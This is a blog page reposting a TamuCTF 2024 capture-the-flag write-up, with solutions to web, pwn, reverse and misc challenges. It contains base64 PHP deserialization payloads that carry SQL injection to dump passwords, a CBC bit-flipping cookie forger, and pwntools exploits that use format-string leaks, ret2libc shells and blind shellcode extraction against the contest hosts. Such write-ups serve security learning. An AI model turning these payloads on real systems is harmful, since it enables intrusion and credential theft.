@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TamuCTF 2024 Writeup - 狼组安全社区 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="TamuCTF 2024 狼组：Web 反序列化+SQL注入+CBC翻转 + Pwn fmt+canary+sandbox 盲注 + Reverse AES 动调。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TamuCTF 2024 Writeup - 狼组安全社区">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/TamuCTF_2024_Writeup/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="TamuCTF 2024 狼组：Web 反序列化+SQL注入+CBC翻转 + Pwn fmt+canary+sandbox 盲注 + Reverse AES 动调。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="php-unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/TamuCTF_2024_Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TamuCTF 2024 Writeup - 狼组安全社区',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TamuCTF 2024 Writeup - 狼组安全社区</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TamuCTF 2024 Writeup - 狼组安全社区"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/172434.html">https://www.ctfiot.com/172434.html</a><br>ID: 172434</p>
+</blockquote>
+<p>点击蓝字</p>
+<p>关注我们</p>
+<p>声明</p>
+<p>本文作者：CTF战队本文字数：约6945字</p>
+<p>阅读时长：约10分钟</p>
+<p>附件&#x2F;链接：点击查看原文下载</p>
+<p>本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载</p>
+<p>CTF战队正在招新~  点击 上方图片了解详情！</p>
+<p>❝</p>
+<p>TAMUctf 2024 tamuctf.com</p>
+<p>Sanity Check</p>
+<p>welcome</p>
+<p>WEB</p>
+<p>Cereal</p>
+<p>sql 注入</p>
+<p>有guest的账户可以登录</p>
+<p>profile.php 有反序列化</p>
+<p>config.php的User类有__wakeup，会调用refresh() 进行sql注入</p>
+<p>flag 应该是在数据库里</p>
+<p>没有waf，跟安卓的sqlite不太像，和mysql更相似</p>
+<p>4字段</p>
+<p>Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiO3M6MTE6IgAqAHBhc3N3b3JkIjtzOjMyOiI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI7czoxMDoiACoAcHJvZmlsZSI7Tjt9</p>
+<p>flag 是admin的密码</p>
+<p>Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjcwOiI5OTkndW5pb24gc2VsZWN0ICAoc2VsZWN0IGdyb3VwX2NvbmNhdChwYXNzd29yZCkgZnJvbSB1c2VycykgLDIsMyw0LS0gIjtzOjExOiIAKgBwYXNzd29yZCI7czozMjoiNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkiO3M6MTA6IgAqAHByb2ZpbGUiO047fQ&#x3D;&#x3D;</p>
+<p>Forgotten Password</p>
+<p>只看到了recover路由的方法,但是不会这个语言…</p>
+<p>想办法把flag发到自己的邮箱</p>
+<p>传一个数组进去，第一个是存在的用户，第二个是自己的邮箱</p>
+<p>Flipped</p>
+<p>CBC翻转字节</p>
+<p>from os import environ<br>from hashlib import md5<br>from Crypto.Cipher import AES<br>from Crypto.Random import get_random_bytes<br>from Crypto.Util.Padding import pad, unpad<br>from flask import Flask, request, make_response, Response<br>from base64 import b64encode, b64decode</p>
+<p>import sys<br>import json</p>
+<p>FLAG &#x3D; environ[‘FLAG’]<br>PORT &#x3D; int(environ[‘PORT’])</p>
+<p>default_session &#x3D; ‘{“admin”: 0, “username”: “guest”}’<br>key &#x3D; get_random_bytes(AES.block_size)<br>app &#x3D; Flask(<strong>name</strong>)</p>
+<p>def encrypt(session):<br> iv &#x3D; get_random_bytes(AES.block_size)<br> cipher &#x3D; AES.new(key, AES.MODE_CBC, iv)<br> return b64encode(iv + cipher.encrypt(pad(session.encode(‘utf-8’), AES.block_size)))</p>
+<p>def decrypt(session):<br> raw &#x3D; b64decode(session)<br> cipher &#x3D; AES.new(key, AES.MODE_CBC, raw[:<br>AES.block_size])<br> try:<br> return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()</p>
+<p>except Exception:<br> return None</p>
+<p>@app.route(‘&#x2F;‘)<br>def index():<br> session &#x3D; request.cookies.get(‘session’)<br> if session &#x3D;&#x3D; None:<br> res &#x3D; Response(open(<strong>file</strong>).read(), mimetype&#x3D;’text&#x2F;plain’)<br> res.set_cookie(‘session’, encrypt(default_session).decode())<br> return res<br> elif (plain_session :&#x3D; decrypt(session)) &#x3D;&#x3D; default_session:<br> return Response(open(<strong>file</strong>).read(), mimetype&#x3D;’text&#x2F;plain’)<br> else:<br> if plain_session !&#x3D; None:<br> try:<br> if json.loads(plain_session)[‘admin’] &#x3D;&#x3D; True:<br> return FLAG<br> else:<br> return ‘You are not an administrator’</p>
+<p>except Exception:<br> return ‘You are not an administrator’<br> else:<br> return ‘You are not an administrator’</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br> app.run(‘0.0.0.0’, PORT)</p>
+<p>应该是把 admin:0 改成 1 就行了，js是弱类型语言</p>
+<p>{“admin”: 0, “us<br>ername”: “guest”<br>}</p>
+<p>16字节一组，admin在第一组，改iv</p>
+<p>def encrypt(session):<br> iv &#x3D; get_random_bytes(AES.block_size)<br> cipher &#x3D; AES.new(key, AES.MODE_CBC, iv)<br> return b64encode(iv + cipher.encrypt(pad(session.encode(‘utf-8’), AES.block_size)))</p>
+<p>iv是随机生成的，拼接在aes加密后的内容前面</p>
+<p>aes加密输入和输出长度相同，那么iv就是第一组，一共四组</p>
+<p>#-<em>- coding:<br>utf8 -</em>-<br>import base64<br>import urllib.parse</p>
+<p>#iv<br>#{“admin”: 0, “us<br>#ername”: “guest”<br>#}</p>
+<p>cipher &#x3D; base64.b64decode(“TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY&#x2F;81gPHaGYLg&#x3D;&#x3D;”)<br>print(len(cipher))</p>
+<p>array_cipher &#x3D; bytearray(cipher)<br>iv &#x3D; array_cipher[0:16]<br>print(iv)</p>
+<p>decode_plain &#x3D; ‘{“admin”: 0, “username”: “guest”}’</p>
+<p>#原始明文<br>plain &#x3D; ‘{“admin”: 1, “us’</p>
+<p>newiv &#x3D; list(iv)</p>
+<p>for i in range(0,16):<br> newiv[i] &#x3D; (ord(plain[i].encode(‘utf-8’)) ^ iv[i] ^ ord(decode_plain[i].encode(‘utf-8’)))</p>
+<p>newiv &#x3D; bytes(newiv)</p>
+<p>print(‘newiv:’,base64.b64encode(newiv+cipher[16:]))</p>
+<p>cbc的那个异或三个参数分别是修改后的明文，密文中对应的值，原始的明文</p>
+<p>Forensics</p>
+<p>Deleted</p>
+<p>Pwn</p>
+<p>Admin Panel</p>
+<p>首先可以在输入密码处溢出覆盖format来利用格式化字符串漏洞</p>
+<p>通过格式化字符串泄露canary和libc，进入admin函数中栈溢出打ret2libc</p>
+<p> from pwn import *<br> context.log_level&#x3D;”debug”<br> def exp():<br>    io &#x3D; remote(“tamuctf.com”, 443, ssl&#x3D;True, sni&#x3D;”admin-panel”)<br>    io.recvuntil(b”Login:n”)<br>    io.recvuntil(b”length 16:n”)<br>    io.sendline(“admin”)<br>    io.recvuntil(b”length 24:n”)<br>    p &#x3D; b”secretpass123”.ljust(0x20,b”A”) + b”%15$p-%17$p”<br>    io.sendline(p)<br>    io.recvuntil(“adminn”)<br>    canary &#x3D; int(io.recvuntil(b”-“,drop&#x3D;True),16)<br>    print(“[+]canary:”,hex(canary))<br>    __libc_start_main &#x3D; int(io.recv(14),16)-235<br>    libc &#x3D; ELF(“.&#x2F;libc.so.6”)<br>    libc_base &#x3D; __libc_start_main - libc.sym[‘__libc_start_main’]<br>    print(“[+]libc_base:”,hex(libc_base))<br>    sys_addr &#x3D; libc_base + libc.sym[‘system’]<br>    sh_addr &#x3D; libc_base + next(libc.search(b”&#x2F;bin&#x2F;shx00”))<br>    rdi_ret &#x3D; libc_base + 0x23a5f<br>    io.recvuntil(b”1, 2 or 3:”)<br>    io.sendline(b”2”)<br>    io.recvuntil(b”went wrong:”)<br>    p &#x3D; b”A”*0x48 + p64(canary) + b”A”<em>8 + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)<br>    io.sendline(p)<br>    io.recv()<br>    io.sendline(b”3”)<br>    io.recvuntil(b”foundn”)<br>    io.sendline(b”cat flag</em>“)<br>    io.recv()</p>
+<p>exp()</p>
+<p>Rift</p>
+<p>一道fmt，但是把输入放到了bss上，这里先利用fmt泄露pie，libc和stack地址，然后通过修改栈内容来更换需要的地址，把payload写到ret位置，最后修改循环跳出条件ret2libc</p>
+<p> from pwn import *<br> context.log_level&#x3D;”debug”<br> def exp():<br>    io &#x3D; remote(“tamuctf.com”, 443, ssl&#x3D;True, sni&#x3D;”rift”)<br>    io.sendline(b”%9$p-%11$p-%13$p.”)<br>    pie &#x3D; int(io.recvuntil(b”-“,drop&#x3D;True)[-14:],16) - 24 - elf.sym[‘main’]<br>    __libc_start_main &#x3D; int(io.recvuntil(b”-“,drop&#x3D;True),16) - 235<br>    libc &#x3D; ELF(“.&#x2F;libc.so.6”)<br>    libc_base &#x3D; __libc_start_main - libc.sym[‘__libc_start_main’]<br>    print(“[+]libc_base:”,hex(libc_base))<br>    sys_addr &#x3D; libc_base + libc.sym[‘system’]<br>    sh_addr &#x3D; libc_base + next(libc.search(b”&#x2F;bin&#x2F;shx00”))<br>    rbp &#x3D; int(io.recv(14),16) - 0xf8<br>    rdi_ret &#x3D; pie + 0x127b<br>    <br>    def fmt(addr,data):<br>        io.sendlineafter(b”.n”,f”%{(addr)&amp;0xffff}c%13$hn.”)<br>        io.sendlineafter(b”.n”,f”%{(data)&amp;0xffff}c%39$hn.”)<br>        io.sendlineafter(b”.n”,f”%{(addr+2)&amp;0xffff}c%13$hn.”)<br>        io.sendlineafter(b”.n”,f”%{(data&gt;&gt;16)&amp;0xffff}c%39$hn.”)<br>        io.sendlineafter(b”.n”,f”%{(addr+4)&amp;0xffff}c%13$hn.”)<br>        io.sendlineafter(b”.n”,f”%{(data&gt;&gt;32)&amp;0xffff}c%39$hn.”)</p>
+<p>    fmt(rbp+0x8,rdi_ret)<br>    fmt(rbp+0x10,sh_addr)<br>    fmt(rbp+0x18,sys_addr)<br>    io.sendlineafter(b”.n”,f”%{(rbp-4)&amp;0xffff}c%13$hn.”)<br>    io.sendlineafter(b”.n”,f”%39$hn”)<br>    io.sendline(b”cat flag*”)<br>    io.recvall()</p>
+<p>exp()</p>
+<p>Confinement</p>
+<p>shellcode类型，有沙箱</p>
+<p>程序通过fork一个子进程来执行shellcode，并由返回值的不同打印出不同的内容，利用打印的内容不相同可以尝试盲注，根据打印内容来判断是否正确</p>
+<p>mov rdx,{j}<br>xor dl,byte ptr [r8-0x1290+{i}]<br>mov rax, 231<br>mov rdi, rdx<br>syscall</p>
+<p>from pwn import *<br>context.log_level &#x3D; ‘error’</p>
+<p>def exp():<br>    flag &#x3D; “”<br>    error &#x3D; []<br>    for i in range(50):<br>        for j in range(32,128):<br>            print(f”{i}-{j}:”,flag)<br>            io &#x3D; remote(“tamuctf.com”, 443, ssl&#x3D;True, sni&#x3D;”confinement”,timeout&#x3D;8)<br>            ‘’’<br>                mov rdx,{j}<br>                xor dl,byte ptr [r8-0x1290+{i}]<br>                mov rax, 231  <br>                mov rdi, rdx<br>                syscall<br>            ‘’’<br>            p &#x3D; b”x48xC7xC2”+p8(j)+b”x00x00x00x41x32x90”+p8(0x70+i)<br>            p +&#x3D;b”xEDxFFxFFx48xC7xC0xE7x00x00x00x48x89xD7x0Fx05”<br>            io.sendline(p)<br>            if b”adios” in io.recv():<br>                flag+&#x3D;chr(j)<br>                break<br>            io.close()</p>
+<p>        if flag[-1] &#x3D;&#x3D; ‘}’:<br>            break<br>              <br>    print(flag)<br>    <br> exp()</p>
+<p>Five</p>
+<p>先通过5字节调用read重新写shellcode到mmap开辟的区域，接着返回时顺序执行刚好就可以执行到shellcode</p>
+<p>from pwn import *<br>context.log_level&#x3D;”debug”<br>context.arch&#x3D;”amd64”<br>def exp():<br>    io &#x3D; remote(“tamuctf.com”, 443, ssl&#x3D;True, sni&#x3D;”five”)<br>    shellcode_x64&#x3D;asm(shellcraft.amd64.sh())<br>    ‘’’<br>      xchg rsi,rdx<br>      syscall<br>    ‘’’<br>    io.send(p)<br>    io.recv()<br>    io.sendline(b”x90”<em>5+shellcode_x64)<br>    io.sendline(b”cat flag</em>“)<br>    io.recv()<br>    <br>exp()</p>
+<p>Misc</p>
+<p>Lost Tourist</p>
+<p><a target="_blank" rel="noopener" href="https://www.google.com/maps/@1.2889099,103.8596131,172m/data=!3m1!1e3?entry=ttu">https://www.google.com/maps/@1.2889099,103.8596131,172m/data=!3m1!1e3?entry=ttu</a></p>
+<p>大概的位置</p>
+<p>Missing</p>
+<p><a target="_blank" rel="noopener" href="https://songslikex.com/songs-like/7bz9h87mPr5kARIVdie77S">https://songslikex.com/songs-like/7bz9h87mPr5kARIVdie77S</a></p>
+<p>Reverse</p>
+<p>Reveille Petter</p>
+<p>用CE修改一下数据就可以出flag</p>
+<p>Resistant</p>
+<p>函数被加密了，动调解密，看到最里面的函数是一个aes&#x2F;cbc加密</p>
+<p>第一个函数解密后可以看到aes的data</p>
+<p>继续动调，让第二个加密的函数自动解密</p>
+<p>key和iv都给出了，调试到key和iv异或之后，将数据提取出来，在线解密即可</p>
+<p>用给的模板发送数据即可</p>
+<p>from pwn import *</p>
+<p>context.log_level &#x3D; “debug”<br>io &#x3D; remote(“tamuctf.com”, 443, ssl&#x3D;True, sni&#x3D;”resistant”)<br>io.sendline(b’N0tUrM0msP4sswd!’)<br>io.recvall()</p>
+<p>作者</p>
+<p>CTF战队</p>
+<p>ctf.wgpsec.org</p>
+<p>扫描关注公众号回复加群</p>
+<p>和师傅们一起讨论研究~</p>
+<p>长</p>
+<p>按</p>
+<p>关</p>
+<p>注</p>
+<p>WgpSec狼组安全团队</p>
+<p>微信号：wgpsec</p>
+<p>Twitter：@wgpsec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span 